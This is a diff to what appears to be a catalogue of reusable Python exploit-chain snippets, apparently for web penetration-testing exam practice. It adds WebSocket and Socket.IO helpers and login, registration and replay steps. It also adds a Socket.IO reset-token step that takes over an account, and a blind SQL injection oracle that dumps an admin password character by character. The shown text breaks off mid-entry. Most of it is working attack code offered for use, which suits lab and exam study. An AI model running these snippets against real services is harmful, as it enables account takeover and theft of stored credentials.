@@ -869,6 +869,246 @@ def json_get(data, path, default=None):
 `
   },
   {
+    id:"helper-websocket-transport",
+    title:"ADD - WebSocket transport helper",
+    category:"Helpers",
+    kind:"add",
+    chainRole:"helper",
+    defaultFunction:"ws_request",
+    aliases:["websocket","ws","transport","cookie header","ws json","ws text","socket helper","burp websocket","proxy websocket"],
+    useWhen:"You already have the HTTP base script, but the interesting request happens over WebSocket. Add this once, then use WS dump/trigger/run_cmd pieces.",
+    editFirst:["normally edit only each WS caller; optionally tune recv_count/recv_until"],
+    dependsOn:[],
+    sourceRefs:["v4","websocket-client"],
+    code:String.raw`def ws_build_url(path_or_url):
+    if path_or_url.startswith("ws://") or path_or_url.startswith("wss://"):
+        return path_or_url
+    return url(path_or_url).replace("http://", "ws://", 1).replace("https://", "wss://", 1)
+
+
+def ws_build_headers(headers=None, cookies=None, session_cookies=True):
+    header = [f"{k}: {v}" for k, v in dict(headers or {}).items()]
+    cookie_dict = {}
+    if session_cookies:
+        cookie_dict.update(s.cookies.get_dict())
+    cookie_dict.update(cookies or {})
+    if cookie_dict:
+        header.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookie_dict.items()))
+    return header
+
+
+def ws_message_set(template, field_path, value):
+    msg = json.loads(json.dumps(template))
+    keys = field_path.split(".") if isinstance(field_path, str) else list(field_path)
+    node = msg
+    for key in keys[:-1]:
+        node = node[int(key)] if isinstance(node, list) else node[key]
+    last = keys[-1]
+    if isinstance(node, list):
+        node[int(last)] = value
+    else:
+        node[last] = value
+    return msg
+
+
+def ws_request(path_or_url, message, *, headers=None, cookies=None, session_cookies=True,
+               origin=None, send_json=True, recv_count=1, recv_until=None, timeout=None):
+    import ssl
+    from urllib.parse import urlparse
+    import websocket  # pip install websocket-client
+
+    opts = {}
+    if not VERIFY_TLS:
+        opts["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
+    if PROXY:
+        proxy = urlparse(PROXY)
+        opts["http_proxy_host"] = proxy.hostname
+        opts["http_proxy_port"] = proxy.port
+
+    ws = websocket.create_connection(
+        ws_build_url(path_or_url),
+        timeout=timeout or TIMEOUT,
+        origin=origin,
+        header=ws_build_headers(headers, cookies, session_cookies),
+        **opts,
+    )
+    ws.send(json.dumps(message) if send_json else str(message))
+    replies = []
+    for _ in range(max(1, recv_count)):
+        raw = ws.recv()
+        replies.append(raw)
+        if recv_until and recv_until in raw:
+            break
+    ws.close()
+    return replies[0] if recv_count == 1 else replies
+`
+  },
+  {
+    id:"helper-socketio-transport",
+    title:"ADD - Socket.IO transport helper",
+    category:"Helpers",
+    kind:"add",
+    chainRole:"helper",
+    defaultFunction:"socketio_request",
+    aliases:["socket.io","socketio","42 event","40 connect","engine.io","EIO","transport websocket","postLogin","socket.io helper"],
+    useWhen:"The Burp WebSocket message starts with Socket.IO frames like 40, 42[\"event\",{...}], ping 2/pong 3, or /socket.io/?EIO=4&transport=websocket.",
+    editFirst:["normally edit each Socket.IO caller: path, event name, payload template, namespace"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4","socket.io","engine.io"],
+    code:String.raw`def socketio_url(path_or_url, eio=4):
+    from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
+    full = ws_build_url(path_or_url)
+    if "transport=websocket" in full:
+        return full
+    if "transport=polling" in full:
+        parts = urlsplit(full)
+        query = dict(parse_qsl(parts.query, keep_blank_values=True))
+        query.pop("sid", None)
+        query.pop("t", None)
+        query["EIO"] = str(query.get("EIO") or eio)
+        query["transport"] = "websocket"
+        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment))
+    sep = "&" if "?" in full else "?"
+    return f"{full}{sep}EIO={eio}&transport=websocket"
+
+
+def socketio_render(obj, **values):
+    if obj is None:
+        return None
+    raw = json.dumps(obj)
+    builtins = {
+        "USERNAME": USERNAME,
+        "PASSWORD": PASSWORD,
+        "TARGET": TARGET,
+        "LHOST": LHOST or "",
+        "LPORT": LPORT or "",
+    }
+    builtins.update({str(k).upper(): v for k, v in values.items()})
+    for key, value in builtins.items():
+        raw = raw.replace("__" + key + "__", str(value))
+    for name in re.findall(r"__LOOT:([A-Za-z0-9_.-]+)__", raw):
+        raw = raw.replace(f"__LOOT:{name}__", str(get_loot(name)))
+    return json.loads(raw)
+
+
+def socketio_replace(obj, **values):
+    # Backward-compatible alias. Prefer socketio_render() in new snippets.
+    return socketio_render(obj, **values)
+
+
+def socketio_payload(template, field_path=None, value=None, **values):
+    msg = socketio_render(template, **values)
+    if field_path is not None:
+        msg = ws_message_set(msg, field_path, value)
+        msg = socketio_render(msg, **values)
+    return msg
+
+
+def socketio_auth_headers():
+    token = get_loot("socketio_auth_token")
+    return {"Authorization": f"Bearer {token}"}
+
+
+def socketio_auth_payload(template, token_field="token", token_name="socketio_auth_token"):
+    msg = socketio_render(template)
+    return ws_message_set(msg, token_field, get_loot(token_name))
+
+
+def socketio_replace_legacy(obj, **values):
+    raw = json.dumps(obj)
+    for key, value in values.items():
+        raw = raw.replace("__" + key.upper() + "__", str(value))
+    return json.loads(raw)
+
+
+def socketio_event_packet(event, data=None, namespace=""):
+    body = json.dumps([event, socketio_render(data or {})], separators=(",", ":"))
+    if namespace:
+        return "42" + namespace + "," + body
+    return "42" + body
+
+
+def socketio_parse_packet(raw):
+    text = raw if isinstance(raw, str) else raw.decode(errors="replace")
+    if text.startswith("42"):
+        body = text[2:]
+        if body.startswith("/"):
+            body = body.split(",", 1)[1]
+        arr = json.loads(body)
+        return {"type": "event", "event": arr[0], "data": arr[1] if len(arr) > 1 else None, "raw": text}
+    if text.startswith("40"):
+        return {"type": "connect", "data": text[2:], "raw": text}
+    if text.startswith("0"):
+        return {"type": "open", "data": json.loads(text[1:] or "{}"), "raw": text}
+    return {"type": "raw", "data": text, "raw": text}
+
+
+def socketio_json_data(raw):
+    parsed = socketio_parse_packet(raw)
+    return parsed["data"] if parsed["type"] == "event" else parsed
+
+
+def socketio_is_control(raw):
+    text = raw if isinstance(raw, str) else raw.decode(errors="replace")
+    return text in ("2", "3", "40") or text.startswith("0") or text.startswith("40")
+
+
+def socketio_request(path_or_url, event, data=None, *, namespace="", eio=4, headers=None,
+                     cookies=None, session_cookies=True, origin=None, recv_count=1,
+                     recv_until=None, timeout=None):
+    import ssl
+    from urllib.parse import urlparse
+    import websocket  # pip install websocket-client
+
+    opts = {}
+    if not VERIFY_TLS:
+        opts["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
+    if PROXY:
+        proxy = urlparse(PROXY)
+        opts["http_proxy_host"] = proxy.hostname
+        opts["http_proxy_port"] = proxy.port
+
+    ws = websocket.create_connection(
+        socketio_url(path_or_url, eio=eio),
+        timeout=timeout or TIMEOUT,
+        origin=origin,
+        header=ws_build_headers(headers, cookies, session_cookies),
+        **opts,
+    )
+
+    try:
+        first = ws.recv()
+        dprint("[socket.io open]", first)
+        connect_packet = "40" + (namespace + "," if namespace else "")
+        ws.send(connect_packet)
+        try:
+            dprint("[socket.io connect]", ws.recv())
+        except Exception:
+            pass
+
+        ws.send(socketio_event_packet(event, data, namespace=namespace))
+        replies = []
+        frames = 0
+        max_frames = max(10, recv_count * 5)
+        while len(replies) < max(1, recv_count) and frames < max_frames:
+            frames += 1
+            raw = ws.recv()
+            if raw == "2":
+                ws.send("3")
+                continue
+            if socketio_is_control(raw):
+                dprint("[socket.io control]", raw)
+                continue
+            replies.append(raw)
+            if recv_until and recv_until in raw:
+                break
+        check(replies, "no Socket.IO event reply received; check EVENT_NAME, namespace, EIO, or whether login only sets a cookie")
+        return replies[0] if recv_count == 1 else replies
+    finally:
+        ws.close()
+`
+  },
+  {
     id:"http-get-named-extract-step",
     title:"REPLACE dump() - Named GET extract step",
     category:"HTTP / Session",
@@ -974,6 +1214,119 @@ def json_get(data, path, default=None):
             hits = regex_hits(body, VALUE_REGEX)
 
     return save_hit(NAME, hits, select=SELECT_HIT, dedupe=DEDUPE, fields_regex=FIELD_REGEX, resp=r)
+`
+  },
+  {
+    id:"websocket-specific-message",
+    title:"REPLACE exploit() - Specific WebSocket message",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"send_specific_websocket_message",
+    aliases:["websocket","ws request","specific request","json message","text message","burp websocket","socket"],
+    useWhen:"You have one exact WebSocket message from Burp and need to replay it inside the final chain.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE","SEND_JSON","EXPECT"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def send_specific_websocket_message():
+    WS_PATH_OR_URL = "/ws"                 # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                          # EDIT
+    HEADERS = {}                           # EDIT
+    COOKIES = {}                           # EDIT
+    SESSION_COOKIES = True                 # EDIT
+    SEND_JSON = True                       # EDIT False for raw text frame
+    MESSAGE = {"action": "ping"}           # EDIT exact Burp WebSocket message
+    EXPECT = ""                            # EDIT optional marker
+    RECV_COUNT = 1                         # EDIT if server sends multiple frames
+
+    raw = ws_request(WS_PATH_OR_URL, MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=SEND_JSON, recv_count=RECV_COUNT)
+    print("[ws]", raw)
+    if EXPECT:
+        text = "\n".join(raw) if isinstance(raw, list) else raw
+        check(EXPECT in text, "expected WebSocket marker missing")
+    return raw
+`
+  },
+  {
+    id:"websocket-named-extract-step",
+    title:"REPLACE dump() - WebSocket named extract step",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"extract_ws_named_value",
+    aliases:["websocket extract","ws extract","named extract","get loot","save loot","json path","regex extract","token"],
+    useWhen:"A WebSocket response contains a reusable token/key/value that later steps need via get_loot(NAME).",
+    editFirst:["NAME","WS_PATH_OR_URL","MESSAGE","VALUE_MODE","VALUE_REGEX","JSON_PATH","MARKER_LEFT","MARKER_RIGHT"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def extract_ws_named_value():
+    NAME = "ws_token"                       # EDIT later: get_loot("ws_token")
+    WS_PATH_OR_URL = "/ws"                  # EDIT
+    ORIGIN = None                           # EDIT
+    HEADERS = {}                            # EDIT
+    COOKIES = {}                            # EDIT
+    SESSION_COOKIES = True                  # EDIT
+    MESSAGE = {"action": "get-token"}       # EDIT exact Burp WebSocket message
+    VALUE_MODE = "json"                     # EDIT: json | regex | marker | raw
+    JSON_PATH = ("token",)                  # EDIT
+    VALUE_REGEX = r'"token"\s*:\s*"([^"]+)"'  # EDIT
+    MARKER_LEFT = "token="                  # EDIT
+    MARKER_RIGHT = ";"                      # EDIT
+
+    raw = ws_request(WS_PATH_OR_URL, MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    if VALUE_MODE == "json":
+        value = json_get(json.loads(raw), JSON_PATH)
+    elif VALUE_MODE == "regex":
+        m = re.search(VALUE_REGEX, raw, re.S)
+        check(m, "regex value not found")
+        value = m.group(1)
+    elif VALUE_MODE == "marker":
+        i = raw.find(MARKER_LEFT)
+        check(i != -1, "left marker missing")
+        i += len(MARKER_LEFT)
+        j = raw.find(MARKER_RIGHT, i)
+        check(j != -1, "right marker missing")
+        value = raw[i:j]
+    elif VALUE_MODE == "raw":
+        value = raw
+    else:
+        die("bad VALUE_MODE")
+    return save_hit(NAME, [str(value)], select="last", dedupe=False)
+`
+  },
+  {
+    id:"websocket-polling-extract",
+    title:"REPLACE dump() - WebSocket polling extract",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"poll_ws_extract",
+    aliases:["websocket polling","ws polling","wait token","async websocket","bot websocket","delayed extract"],
+    useWhen:"A bot/background job makes a WebSocket-visible value appear later; poll the same WS message until it appears.",
+    editFirst:["SAVE_NAME","WS_PATH_OR_URL","MESSAGE","MAX_ATTEMPTS","SLEEP_SECONDS","VALUE_REGEX"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def poll_ws_extract():
+    SAVE_NAME = "async_value"               # EDIT later: get_loot("async_value")
+    WS_PATH_OR_URL = "/ws/status"           # EDIT
+    ORIGIN = None                           # EDIT
+    HEADERS = {}                            # EDIT
+    COOKIES = {}                            # EDIT
+    SESSION_COOKIES = True                  # EDIT
+    MESSAGE = {"action": "status"}          # EDIT
+    MAX_ATTEMPTS = 20                       # EDIT
+    SLEEP_SECONDS = 1.0                     # EDIT
+    VALUE_REGEX = r'token=([^;"\s]+)'       # EDIT
+
+    for attempt in range(1, MAX_ATTEMPTS + 1):
+        raw = ws_request(WS_PATH_OR_URL, MESSAGE, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+        hits = regex_hits(raw, VALUE_REGEX)
+        if hits:
+            return save_hit(SAVE_NAME, hits, select="last", dedupe=True)
+        if attempt % 5 == 0:
+            print(f"[wait] {SAVE_NAME}: no hit, attempt {attempt}")
+        time.sleep(SLEEP_SECONDS)
+    die(f"{SAVE_NAME} not found after {MAX_ATTEMPTS} attempts")
 `
   },
   {
@@ -1282,6 +1635,47 @@ def json_get(data, path, default=None):
 `
   },
   {
+    id:"create-user-websocket",
+    title:"REPLACE login() - WebSocket create user first",
+    category:"Authentication",
+    kind:"replace",
+    chainRole:"auth",
+    defaultFunction:"create_user_websocket",
+    aliases:["websocket create user","ws register","signup websocket","bootstrap user","register socket"],
+    useWhen:"Registration/account bootstrap is performed through a WebSocket message before the rest of the exploit chain.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","USER_FIELD","PASS_FIELD","SUCCESS_TEST"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def create_user_websocket():
+    global USERNAME, PASSWORD
+    WS_PATH_OR_URL = "/ws/register"          # EDIT
+    ORIGIN = None                            # EDIT
+    HEADERS = {}                             # EDIT
+    COOKIES = {}                             # EDIT
+    SESSION_COOKIES = True                   # EDIT
+    MESSAGE_TEMPLATE = {                     # EDIT exact Burp WS registration shape
+        "action": "register",
+        "username": "__USERNAME__",
+        "password": "__PASSWORD__",
+        "email": "__EMAIL__",
+    }
+    USER_PREFIX = "oswe"                     # EDIT
+    EMAIL_DOMAIN = "example.test"            # EDIT
+    SUCCESS_MARKER = "ok"                    # EDIT
+
+    suffix = str(int(time.time()))
+    USERNAME = f"{USER_PREFIX}_{suffix}"
+    PASSWORD = PASSWORD if PASSWORD != "pass" else f"Pass{suffix}!"
+    raw = json.dumps(MESSAGE_TEMPLATE)
+    raw = raw.replace("__USERNAME__", USERNAME).replace("__PASSWORD__", PASSWORD).replace("__EMAIL__", f"{USERNAME}@{EMAIL_DOMAIN}")
+    reply = ws_request(WS_PATH_OR_URL, raw, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=False)
+    dprint("[ws create]", reply)
+    check(SUCCESS_MARKER in reply, "websocket create user failed")
+    print(f"[+] created ws user: {USERNAME}:{PASSWORD}")
+    return {"username": USERNAME, "password": PASSWORD}
+`
+  },
+  {
     id:"login-form-basic",
     title:"REPLACE login() - Form login",
     category:"Authentication",
@@ -1397,6 +1791,715 @@ def json_get(data, path, default=None):
     HEADERS = {"Authorization": f"{HEADER_SCHEME} {secret}"}
     print("[+] bearer HEADERS ready; pass them to send_request(..., headers=HEADERS)")
     return HEADERS
+`
+  },
+  {
+    id:"login-websocket-json-token",
+    title:"REPLACE login() - WebSocket JSON token",
+    category:"Authentication",
+    kind:"replace",
+    chainRole:"auth",
+    defaultFunction:"login_websocket_json_token",
+    aliases:["websocket login","ws login","json token","bearer","authorization","socket auth","api token"],
+    useWhen:"Login/auth token is returned by a WebSocket JSON message instead of an HTTP endpoint.",
+    editFirst:["WS_PATH_OR_URL","MESSAGE_TEMPLATE","TOKEN_PATH","HEADER_SCHEME","COOKIE_NAME","AUTH_OUTPUT"],
+    dependsOn:["helper-websocket-transport"],
+    sourceRefs:["v4"],
+    code:String.raw`def login_websocket_json_token():
+    WS_PATH_OR_URL = "/ws/login"                 # EDIT or full ws:// / wss:// URL
+    ORIGIN = None                                # EDIT: url("/") if server checks Origin
+    HEADERS = {}                                 # EDIT pre-auth WS headers
+    COOKIES = {}                                 # EDIT pre-auth cookies
+    SESSION_COOKIES = True                       # EDIT include existing s.cookies in Cookie header
+    MESSAGE_TEMPLATE = {                         # EDIT exact Burp WebSocket login shape
+        "action": "login",
+        "username": "__USERNAME__",
+        "password": "__PASSWORD__",
+    }
+    TOKEN_PATH = ("token",)                      # EDIT e.g. ("data", "access_token")
+    HEADER_SCHEME = "Bearer"                     # EDIT
+    COOKIE_NAME = ""                             # EDIT set if token must be a cookie instead of Authorization
+    AUTH_OUTPUT = "header"                       # EDIT: header | cookie | both
+
+    msg = json.loads(json.dumps(MESSAGE_TEMPLATE))
+    raw = json.dumps(msg)
+    raw = raw.replace("__USERNAME__", USERNAME).replace("__PASSWORD__", PASSWORD)
+    raw_reply = ws_request(WS_PATH_OR_URL, raw, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN, send_json=False)
+    dprint("[ws login]", raw_reply)
+    data = json.loads(raw_reply)
+    token = json_get(data, TOKEN_PATH)
+    check(token, "websocket login token missing")
+
+    auth = {"headers": {}, "cookies": {}}
+    if AUTH_OUTPUT in ("header", "both"):
+        auth["headers"]["Authorization"] = f"{HEADER_SCHEME} {token}"
+    if AUTH_OUTPUT in ("cookie", "both"):
+        check(COOKIE_NAME, "set COOKIE_NAME for cookie auth output")
+        auth["cookies"][COOKIE_NAME] = token
+        s.cookies.set(COOKIE_NAME, token)
+    print("[+] websocket auth token ready")
+    return auth
+`
+  },
+  {
+    id:"login-socketio-json-token",
+    title:"REPLACE login() - Socket.IO JSON token",
+    category:"Authentication",
+    kind:"replace",
+    chainRole:"auth",
+    defaultFunction:"login_socketio_json_token",
+    aliases:["socket.io login","socketio login","42 login","postLogin","socket.io token","engine.io auth","websocket socket.io"],
+    useWhen:"Login is a Socket.IO event like 42[\"postLogin\",{\"email\":\"...\",\"password\":\"...\"}] and the response returns a token/cookie value.",
+    editFirst:["WS_PATH_OR_URL","EVENT_NAME","PAYLOAD_TEMPLATE","TOKEN_PATH","AUTH_OUTPUT","COOKIE_NAME","NAMESPACE"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def login_socketio_json_token():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT path or full ws://.../socket.io/?EIO=4&transport=websocket
+    EIO = 4                                 # EDIT 4 or 3
+    NAMESPACE = ""                          # EDIT e.g. "/admin"; usually ""
+    ORIGIN = None                           # EDIT url("/") if checked
+    HEADERS = {}                            # EDIT pre-auth headers
+    COOKIES = {}                            # EDIT pre-auth cookies
+    SESSION_COOKIES = True                  # EDIT reuse s.cookies if login has previous HTTP step
+    EVENT_NAME = "postLogin"                # EDIT exact Socket.IO event name from Burp
+    PAYLOAD_TEMPLATE = {                    # EDIT exact event object; placeholders auto-filled
+        "email": "__USERNAME__",
+        "password": "__PASSWORD__",
+    }
+    TOKEN_PATH = ("token",)                 # EDIT e.g. ("data", "accessToken")
+    HEADER_SCHEME = "Bearer"                # EDIT
+    AUTH_OUTPUT = "header"                  # EDIT: header | cookie | both
+    COOKIE_NAME = ""                        # EDIT if AUTH_OUTPUT uses cookie
+
+    payload = socketio_replace(PAYLOAD_TEMPLATE, username=USERNAME, password=PASSWORD)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, payload, namespace=NAMESPACE, eio=EIO,
+                           headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, origin=ORIGIN)
+    dprint("[socket.io login]", raw)
+    data = socketio_json_data(raw)
+    token = json_get(data, TOKEN_PATH)
+    check(token, "Socket.IO login token missing")
+    save_loot("socketio_auth_token", token, resp=raw)
+    save_loot("auth_token", token, resp=raw)
+
+    auth = {"headers": {}, "cookies": {}}
+    if AUTH_OUTPUT in ("header", "both"):
+        auth["headers"]["Authorization"] = f"{HEADER_SCHEME} {token}"
+    if AUTH_OUTPUT in ("cookie", "both"):
+        check(COOKIE_NAME, "set COOKIE_NAME")
+        auth["cookies"][COOKIE_NAME] = token
+        s.cookies.set(COOKIE_NAME, token)
+    print("[+] Socket.IO auth token ready")
+    return auth
+`
+  },
+  {
+    id:"create-user-socketio",
+    title:"REPLACE login() - Socket.IO create user first",
+    category:"Authentication",
+    kind:"replace",
+    chainRole:"auth",
+    defaultFunction:"create_user_socketio",
+    aliases:["socket.io register","socketio signup","42 register","create user socket.io","websocket register"],
+    useWhen:"Account creation/bootstrap is a Socket.IO event and must run before login or exploit.",
+    editFirst:["WS_PATH_OR_URL","EVENT_NAME","PAYLOAD_TEMPLATE","SUCCESS_MARKER","NAMESPACE"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def create_user_socketio():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "register"                 # EDIT exact event from Burp
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    ORIGIN = None                           # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT
+        "username": "__USERNAME__",
+        "password": "__PASSWORD__",
+        "email": "__USERNAME__",
+    }
+    SUCCESS_MARKER = "ok"                   # EDIT marker in raw reply
+
+    payload = socketio_replace(PAYLOAD_TEMPLATE, username=USERNAME, password=PASSWORD)
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, payload, namespace=NAMESPACE, eio=EIO, origin=ORIGIN)
+    dprint("[socket.io register]", raw)
+    check(SUCCESS_MARKER in raw, "Socket.IO create user failed")
+    print("[+] Socket.IO user created")
+    return True
+`
+  },
+  {
+    id:"socketio-specific-event",
+    title:"REPLACE exploit() - Specific Socket.IO event",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"send_specific_socketio_event",
+    aliases:["socket.io","socketio","42 event","specific socket.io","postLogin","event replay","burp socket.io"],
+    useWhen:"You have one exact Socket.IO event from Burp and need to replay it in the final chain.",
+    editFirst:["WS_PATH_OR_URL","EVENT_NAME","PAYLOAD","EXPECT","NAMESPACE"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def send_specific_socketio_event():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "eventName"                # EDIT e.g. postLogin, sendMessage, runTask
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    ORIGIN = None                           # EDIT
+    REQ_HEADERS = HEADERS                   # EDIT use global auth headers or replace
+    REQ_COOKIES = COOKIES                   # EDIT
+    PAYLOAD = {"key": "value"}              # EDIT exact event data object from Burp
+    EXPECT = ""                             # EDIT optional marker
+
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, PAYLOAD, namespace=NAMESPACE, eio=EIO,
+                           headers=REQ_HEADERS, cookies=REQ_COOKIES, origin=ORIGIN)
+    print("[socket.io]", raw[:1000])
+    if EXPECT:
+        check(EXPECT in raw, "Socket.IO marker missing")
+    return raw
+`
+  },
+  {
+    id:"socketio-named-extract-step",
+    title:"REPLACE dump() - Socket.IO named extract step",
+    category:"HTTP / Session",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"extract_named_socketio_value",
+    aliases:["socket.io extract","socketio extract","42 extract","token extract","json path","regex socket.io","save loot"],
+    useWhen:"A Socket.IO event response contains a token/key/value needed by later steps via get_loot(NAME).",
+    editFirst:["NAME","WS_PATH_OR_URL","EVENT_NAME","PAYLOAD","VALUE_MODE","VALUE_REGEX","JSON_PATH"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def extract_named_socketio_value():
+    NAME = "socket_value"                   # EDIT later: get_loot("socket_value")
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "getToken"                 # EDIT
+    PAYLOAD = {}                            # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    VALUE_MODE = "json"                     # EDIT: json | regex | raw
+    JSON_PATH = ("token",)                  # EDIT
+    VALUE_REGEX = r'"token"\s*:\s*"([^"]+)"' # EDIT
+
+    raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, PAYLOAD, namespace=NAMESPACE, eio=EIO)
+    data = socketio_json_data(raw)
+    if VALUE_MODE == "json":
+        value = json_get(data, JSON_PATH)
+    elif VALUE_MODE == "regex":
+        value = save_hit(NAME, regex_hits(raw, VALUE_REGEX), resp=raw)
+        return value
+    else:
+        value = raw
+    return save_loot(NAME, value, resp=raw)
+`
+  },
+  {
+    id:"token-reset-socketio-flow",
+    title:"REPLACE step - Socket.IO reset token takeover",
+    category:"Tokens",
+    kind:"replace",
+    chainRole:"exploit",
+    defaultFunction:"socketio_reset_token_takeover",
+    aliases:["socket.io reset password","socketio reset token","42 forgot password","token leak socket.io","admin takeover"],
+    useWhen:"Password reset/token flow is driven by Socket.IO events instead of normal HTTP.",
+    editFirst:["REQUEST_EVENT","LEAK_EVENT","CONFIRM_EVENT","TOKEN_REGEX","PAYLOAD_TEMPLATE","NEW_PASSWORD"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def socketio_reset_token_takeover():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    REQUEST_EVENT = "requestReset"          # EDIT
+    LEAK_EVENT = "getResetToken"            # EDIT or same as REQUEST_EVENT if response leaks token
+    CONFIRM_EVENT = "confirmReset"          # EDIT
+    TOKEN_REGEX = r'"token"\s*:\s*"([^"]+)"' # EDIT
+    NEW_PASSWORD = PASSWORD                 # EDIT
+    REQUEST_PAYLOAD = {"user": "__USERNAME__"} # EDIT
+    LEAK_PAYLOAD = {"user": "__USERNAME__"}    # EDIT
+    CONFIRM_TEMPLATE = {                    # EDIT
+        "user": "__USERNAME__",
+        "token": "__TOKEN__",
+        "password": "__PASSWORD__",
+    }
+    SUCCESS_MARKER = "ok"                   # EDIT
+
+    socketio_request(WS_PATH_OR_URL, REQUEST_EVENT, socketio_replace(REQUEST_PAYLOAD, username=USERNAME), namespace=NAMESPACE, eio=EIO)
+    raw = socketio_request(WS_PATH_OR_URL, LEAK_EVENT, socketio_replace(LEAK_PAYLOAD, username=USERNAME), namespace=NAMESPACE, eio=EIO)
+    token = save_hit("reset_token", regex_hits(raw, TOKEN_REGEX), resp=raw)
+    payload = socketio_replace(CONFIRM_TEMPLATE, username=USERNAME, token=token, password=NEW_PASSWORD)
+    reply = socketio_request(WS_PATH_OR_URL, CONFIRM_EVENT, payload, namespace=NAMESPACE, eio=EIO)
+    check(SUCCESS_MARKER in reply, "Socket.IO reset confirm failed")
+    print("[+] Socket.IO password reset complete")
+    return token
+`
+  },
+  {
+    id:"socketio-boolean-oracle-dump",
+    title:"REPLACE dump() - Socket.IO boolean oracle extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_socketio_boolean_oracle",
+    aliases:["socket.io boolean","socketio boolean","42 boolean","blind sqli socket.io","oracle socket.io","binary search"],
+    useWhen:"A Socket.IO event gives true/false signal for injected predicates, e.g. username taken, status, marker, or JSON flag.",
+    editFirst:["EVENT_NAME","PAYLOAD_TEMPLATE","PAYLOAD_FIELD","TRUE_MARKER","LENGTH_EXPR","CHAR_EXPR"],
+    dependsOn:["helper-socketio-transport"],
+    sourceRefs:["v4","socket.io"],
+    code:String.raw`def dump_socketio_boolean_oracle():
+    WS_PATH_OR_URL = "/socket.io/"          # EDIT
+    EVENT_NAME = "check"                    # EDIT
+    EIO = 4                                 # EDIT
+    NAMESPACE = ""                          # EDIT
+    TARGET_NAME = "admin"                   # EDIT
+    PAYLOAD_TEMPLATE = {                    # EDIT exact event data shape
+        "token": "__LOOT:socketio_auth_token__", # EDIT remove if no token-in-payload
+        "u": "__PAYLOAD__",
+    }
+    PAYLOAD_FIELD = "u"                     # EDIT field containing injection
+    TRUE_MARKER = "taken"                   # EDIT true marker in raw response
+    INJECTION = "{target}' AND ({q})-- -"   # EDIT
+    LENGTH_EXPR = "LEN(password)={n}"       # EDIT DBMS syntax
+    CHAR_EXPR = "ASCII(SUBSTRING(password,{i},1)) BETWEEN {lo} AND {mid}" # EDIT
+    MAX_LEN = 80                            # EDIT
+
+    def oracle(q):
+        inj = INJECTION.format(target=TARGET_NAME, q=q)
+        msg = ws_message_set(PAYLOAD_TEMPLATE, PAYLOAD_FIELD, inj)
+        raw = socketio_request(WS_PATH_OR_URL, EVENT_NAME, msg, namespace=NAMESPACE, eio=EIO)
+        dprint("[socket.io oracle]", q, raw[:200])
+        return TRUE_MARKER in raw
+
+    length = next((n for n in range(1, MAX_LEN + 1) if oracle(LENGTH_EXPR.format(n=n))), 0)
+    check(length, "length not found")
+    out = ""
+    for i in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if oracle(CHAR_EXPR.format(i=i, lo=lo, mid=mid)):
+                hi = mid - 1
+            else:
+                lo = mid + 1
+        out += chr(lo)
+        print("[partial]", out)
+    return save_loot("socketio_dump", out)
+`
+  },
+  {
+    id:"socketio-visible-response-dump",
+    title:"REPLACE dump() - Socket.IO visible response extractor",
+    category:"SQLi / Oracle",
+    kind:"replace",
+    chainRole:"extract",
+    defaultFunction:"dump_socketio_visible_response",
